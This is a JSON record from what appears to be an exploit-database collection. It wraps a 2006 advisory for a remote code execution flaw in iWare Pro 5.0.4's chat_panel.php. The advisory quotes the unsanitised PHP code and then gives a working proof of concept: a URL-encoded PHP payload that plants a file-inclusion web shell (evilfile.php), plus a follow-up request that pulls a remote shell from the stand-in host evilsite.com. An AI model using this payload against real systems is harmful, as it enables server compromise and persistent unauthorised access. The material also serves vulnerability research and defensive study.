{
  "id": "2733",
  "title": "iWare Pro 5.0.4 - &#039;chat_panel.php&#039; Remote Code Execution",
  "cve": "CVE-2006-5837",
  "vuln_type": "rce",
  "code": "+-------------------------------------------------------------------------------------------\r\n+ iWare Pro <= 5.0.4 (chat_panel.php) Remote Code Execution Vulnerability\r\n+-------------------------------------------------------------------------------------------\r\n+ Affected Software .: iWare Professional CMS <= 5.0.4\r\n+ Vendor ............: http://www.dsiware.com/\r\n+ Download ..........: http://dsiware.com/download.php\r\n+ Description .......: \"iWare is a Open Source PHP & MySQL Content Management System\"\r\n+ Class .............: Remote Code Execution\r\n+ Risk ..............: High (Remote Code Execution)\r\n+ Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>\r\n+-------------------------------------------------------------------------------------------\r\n+ Details:\r\n+ iWare admin/mods/simplechat_1.0.0/chat_panel.php does not sanatize the $message variable\r\n+ in the first argument of the PostMessage() function on line 11 before writing the variable\r\n+ contents to chat_log.php on line 25. When chat_panel.php is requested, the PostMessage()\r\n+ function is called on line 32 and $_REQUEST['msg'] is written to chat_log.php unsanatized.\r\n+\r\n+ Vulnerable Code: \r\n+ admin/mods/simplechat_1.0.0/chat_panel.php, line(s) 11-32:\r\n+ -> 11: function PostMessage($message) {\r\n+ -> 16:  $new_message = \"\".$message.\"<br />\\n\";\r\n+ -> 23:  $open_file = fopen(\"chat_log.php\", \"w\");\r\n+ -> 25:  fputs($open_file, stripslashes($new_message));\r\n+ -> 28:  fclose($open_file);\r\n+ -> 29: }\r\n+ -> 32: if($_REQUEST['talk']==1){PostMessage($_REQUEST['msg']);}\r\n+ \r\n+ Proof Of Concept:\r\n+ http://[target]/[path]/admin/mods/simplechat_1.0.0/chat_panel.php?talk=1&msg=[evilcode]\r\n+ http://[target]/[path]/admin/mods/simplechat_1.0.0/chat_log.php\r\n+ -> http://[target]/[path]/admin/mods/simplechat_1.0.0/chat_panel.php?talk=1&msg=%3C%3Fphp%0D%0A%24open_file+%3D+fopen%28%22..%2F..%2F..%2Fevilfile.php%22%2C+%22w%22%29%3B%0D%0Afputs%28%24open_file%2C%22%3C%3Fphp+include%28%5C%24_GET%5B%27evil_include%27%5D%29%3B+%3F%3E%22%29%3B%0D%0Afclose%28%24open_file%29%3B%0D%0Achmod%28%22..%2F..%2F..%2Fevilfile.php%22%2C0777%29%3B%0D%0A%3F%3E\r\n+ -> http://[target]/[path]/admin/mods/simplechat_1.0.0/chat_log.php\r\n+ -> http://[target]/[path]/evilfile.php?evil_include=http://evilsite.com/shell.php\r\n+-------------------------------------------------------------------------------------------\r\n\r\n# milw0rm.com [2006-11-07]",
  "url": "https://www.exploit-db.com/exploits/2733"
}